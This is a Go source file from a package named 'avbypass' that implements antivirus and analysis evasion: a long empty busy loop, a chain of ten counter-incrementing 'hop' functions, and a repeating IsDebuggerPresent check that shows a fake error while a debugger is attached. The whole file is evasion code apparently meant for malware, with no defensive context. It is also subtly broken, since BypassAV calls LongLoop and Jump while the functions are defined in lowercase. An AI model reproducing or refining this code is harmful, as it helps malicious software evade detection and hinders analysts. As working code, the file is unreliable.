package avbypass

var magicNumber int64

// TODO wait til user clicks

func BypassAV() {
	LongLoop()
	Jump()
	//Wait()
	checkDebugger()
}

func jump() {
	magicNumber++
	hop1()
}

func longLoop() {
	for i := 0; i < 1000000; i++ {
	}
}

func checkDebugger() {
	Flag, _, _ := IsDebuggerPresent.Call()
	if Flag != 0 {
		Run("msg * Error")
		Wait()
		checkDebugger()

	}
}

func hop1() {
	magicNumber++
	hop2()
}
func hop2() {
	magicNumber++
	hop3()
}
func hop3() {
	magicNumber++
	hop4()
}
func hop4() {
	magicNumber++
	hop5()
}
func hop5() {
	magicNumber++
	hop6()
}
func hop6() {
	magicNumber++
	hop7()
}
func hop7() {
	magicNumber++
	hop8()
}
func hop8() {
	magicNumber++
	hop9()
}
func hop9() {
	magicNumber++
	hop10()
}
func hop10() {
	magicNumber++
}
